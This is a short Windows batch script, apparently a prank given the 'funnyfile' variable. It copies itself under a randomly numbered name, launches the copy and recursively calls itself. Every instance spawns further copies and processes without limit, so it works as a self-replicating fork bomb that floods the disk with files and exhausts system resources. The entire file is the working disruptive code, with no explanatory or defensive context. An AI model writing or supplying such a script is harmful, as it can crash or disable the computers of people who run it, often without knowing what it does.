@echo off
setlocal enabledelayedexpansion

:: Define the original batch file name
set "funnyfile=%~nx0"

:: Create a duplicate file with a random number appended to the name
set /a num=%random%
copy "%funnyfile%" "%funnyfile%_!num!.bat"

:: Wait for a second
timeout /t 1 >nul

:: Run the duplicate file
start "" "%funnyfile%_!num!.bat"

:: Refresh the script
goto :start

:start
:: Repeat the process
call "%funnyfile%"
